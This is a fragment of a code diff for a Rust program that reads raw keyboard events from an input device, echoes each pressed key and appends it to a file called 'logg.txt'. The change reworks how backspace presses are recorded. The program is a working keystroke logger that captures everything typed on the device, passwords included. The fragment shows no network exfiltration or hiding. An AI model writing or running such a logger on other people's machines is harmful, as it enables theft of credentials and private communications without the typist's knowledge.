@@ -16,19 +16,31 @@ fn main() -> std::io::Result<()> {
         .open("logg.txt")?;
 
     let key_map = create_keymap();
-    let mut backspace_found = 0;
+    let mut backspace_found: bool = false;
     loop {
         for ev in device.fetch_events().expect("Failed to fetch events") {
             if let InputEventKind::Key(key) = ev.kind() {
                 if ev.value() == 1 {
-                    if let Some(character) = key_map.get(&key) {
-                        if !backspace_found {
-                            print!("{}", character);
-                            io::stdout().flush().unwrap();
-                            log_file.write_all(character.as_bytes())?;
-                            log_file.flush()?;
+                        if key != Key::KEY_BACKSPACE {
+                            backspace_found = false;
+                            if let Some(character) = key_map.get(&key) {
+                                print!("{}", character);
+                                io::stdout().flush().unwrap();
+                                log_file.write_all(character.as_bytes())?;
+                                log_file.flush()?;
+                            }
+                        } else {
+                            if backspace_found {
+                                continue;
+                            }
+                            else{
+                                println!();
+                                io::stdout().flush().unwrap();
+                                log_file.write_all(b"\n")?;
+                                log_file.flush()?;
+                                backspace_found = true;
+                            }
                         }
-                    }
                 }
             }
         }
